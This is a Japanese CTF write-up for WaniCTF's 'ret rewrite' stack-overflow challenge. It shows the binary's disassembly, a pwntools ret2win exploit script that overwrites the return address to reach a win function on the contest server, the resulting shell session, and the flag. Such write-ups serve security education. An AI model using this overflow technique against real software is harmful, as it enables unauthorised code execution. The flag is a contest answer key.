# ret rewrite:PWN:pts
nc ret.wanictf.org 9005  
- stackの仕組みを学びましょう。  
- 関数の戻りアドレスはstackに積まれます。  
- "congraturation"が出力されてもスタックのアライメントの問題でwin関数のアドレスから少しずらす必要がある場合があります。  
- (echo -e "\x11\x11\x11\x11\x11\x11"; cat) | nc ret.wanictf.org 9005  
- 念のためpwntoolsのサンプルプログラム「pwn05_sample.py」を載せておきました。  

使用ツール例  
- cat  
- [netcat (nc)](https://github.com/wani-hackase/memo-setup-pwn-utils#netcat)  
- echo  
- [pwntools](https://github.com/wani-hackase/memo-setup-pwn-utils#pwntools)  

セキュリティ保護  
- Partial RELocation ReadOnly (RELRO)  
- Stack Smash Protection (SSP)無効  
- No eXecute bit(NX)有効  
- Position Independent Executable (PIE)無効  

[pwn05](pwn05)　　　　[pwn05.c](pwn05.c)　　　　[pwn05_sample.py](pwn05_sample.py)  

# Solution
pwn05が配られる。  
objdumpで中を確認する。  
```bash
$ objdump -D pwn05
~~~
0000000000400837 <win>:
  400837:       55                      push   %rbp
  400838:       48 89 e5                mov    %rsp,%rbp
  40083b:       48 8d 3d 92 02 00 00    lea    0x292(%rip),%rdi        # 400ad4 <_IO_stdin_used+0x4>
  400842:       e8 79 fe ff ff          callq  4006c0 <puts@plt>
  400847:       48 8d 3d 96 02 00 00    lea    0x296(%rip),%rdi        # 400ae4 <_IO_stdin_used+0x14>
  40084e:       e8 ad fe ff ff          callq  400700 <system@plt>
  400853:       bf 00 00 00 00          mov    $0x0,%edi
  400858:       e8 e3 fe ff ff          callq  400740 <exit@plt>

000000000040085d <vuln>:
  40085d:       55                      push   %rbp
  40085e:       48 89 e5                mov    %rsp,%rbp
  400861:       48 83 ec 10             sub    $0x10,%rsp
  400865:       48 8d 3d 80 02 00 00    lea    0x280(%rip),%rdi        # 400aec <_IO_stdin_used+0x1c>
  40086c:       b8 00 00 00 00          mov    $0x0,%eax
  400871:       e8 9a fe ff ff          callq  400710 <printf@plt>
  400876:       48 8d 45 f2             lea    -0xe(%rbp),%rax
  40087a:       ba 00 01 00 00          mov    $0x100,%edx
  40087f:       48 89 c6                mov    %rax,%rsi
  400882:       bf 00 00 00 00          mov    $0x0,%edi
  400887:       e8 a4 fe ff ff          callq  400730 <read@plt>
  40088c:       89 45 fc                mov    %eax,-0x4(%rbp)
  40088f:       8b 45 fc                mov    -0x4(%rbp),%eax
  400892:       83 e8 01                sub    $0x1,%eax
  400895:       48 98                   cltq
  400897:       c6 44 05 f2 00          movb   $0x0,-0xe(%rbp,%rax,1)
  40089c:       48 8d 3d d5 07 20 00    lea    0x2007d5(%rip),%rdi        # 601078 <str_head>
  4008a3:       e8 38 fe ff ff          callq  4006e0 <strlen@plt>
  4008a8:       48 89 c2                mov    %rax,%rdx
  4008ab:       48 8d 35 c6 07 20 00    lea    0x2007c6(%rip),%rsi        # 601078 <str_head>
  4008b2:       bf 00 00 00 00          mov    $0x0,%edi
  4008b7:       e8 14 fe ff ff          callq  4006d0 <write@plt>
  4008bc:       48 8d 45 f2             lea    -0xe(%rbp),%rax
  4008c0:       48 89 c7                mov    %rax,%rdi
  4008c3:       e8 18 fe ff ff          callq  4006e0 <strlen@plt>
  4008c8:       48 89 c2                mov    %rax,%rdx
  4008cb:       48 8d 45 f2             lea    -0xe(%rbp),%rax
  4008cf:       48 89 c6                mov    %rax,%rsi
  4008d2:       bf 00 00 00 00          mov    $0x0,%edi
  4008d7:       e8 f4 fd ff ff          callq  4006d0 <write@plt>
  4008dc:       48 8d 3d 9c 07 20 00    lea    0x20079c(%rip),%rdi        # 60107f <str_tail>
  4008e3:       e8 f8 fd ff ff          callq  4006e0 <strlen@plt>
  4008e8:       48 89 c2                mov    %rax,%rdx
  4008eb:       48 8d 35 8d 07 20 00    lea    0x20078d(%rip),%rsi        # 60107f <str_tail>
  4008f2:       bf 00 00 00 00          mov    $0x0,%edi
  4008f7:       e8 d4 fd ff ff          callq  4006d0 <write@plt>
  4008fc:       48 89 ea                mov    %rbp,%rdx
  4008ff:       48 89 e0                mov    %rsp,%rax
  400902:       48 89 d6                mov    %rdx,%rsi
  400905:       48 89 c7                mov    %rax,%rdi
  400908:       e8 6a 00 00 00          callq  400977 <debug_stack_dump>
  40090d:       90                      nop
  40090e:       c9                      leaveq
  40090f:       c3                      retq

0000000000400910 <main>:
  400910:       55                      push   %rbp
  400911:       48 89 e5                mov    %rsp,%rbp
  400914:       b8 00 00 00 00          mov    $0x0,%eax
  400919:       e8 0c 00 00 00          callq  40092a <init>
  40091e:       b8 00 00 00 00          mov    $0x0,%eax
  400923:       e8 35 ff ff ff          callq  40085d <vuln>
  400928:       eb f4                   jmp    40091e <main+0xe>
~~~
```
ret2winを行えばよい。  
以下のpwnpwn05.pyで行う。  
```python:pwnpwn05.py
from pwn import *

elf = ELF('./pwn05')
io = remote("ret.wanictf.org", 9005)
#io = process(elf.path)
rop = ROP(elf)

win = elf.symbols['win']
ret = (rop.find_gadget(['ret']))[0]

io.readuntil("What's your name?: ")

base = b'A' * 22
payload = base + p64(ret) + p64(win)
io.sendline(payload)
io.interactive()
```
実行する。  
```bash
$ python pwnpwn05.py
[*] '/pwn05'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to ret.wanictf.org on port 9005: Done
[*] Loaded 14 cached gadgets for './pwn05'
[*] Switching to interactive mode
Hello AAAAAAAAAA'!

***start stack dump***
0x7ffdee308980: 0x4141414141418a80 <- rsp
0x7ffdee308988: 0x0000002741414141
0x7ffdee308990: 0x4141414141414141 <- rbp
0x7ffdee308998: 0x0000000000400696 <- return address
0x7ffdee3089a0: 0x0000000000400837
0x7ffdee3089a8: 0x00007efd73ef9b00
0x7ffdee3089b0: 0x0000000000000001
***end stack dump***

congratulation!
$ ls
chall
flag.txt
redir.sh
$ cat flag.txt
FLAG{1earning-how-return-address-w0rks-on-st4ck}
$
[*] Interrupted
```
flagが得られた。  

## FLAG{1earning-how-return-address-w0rks-on-st4ck}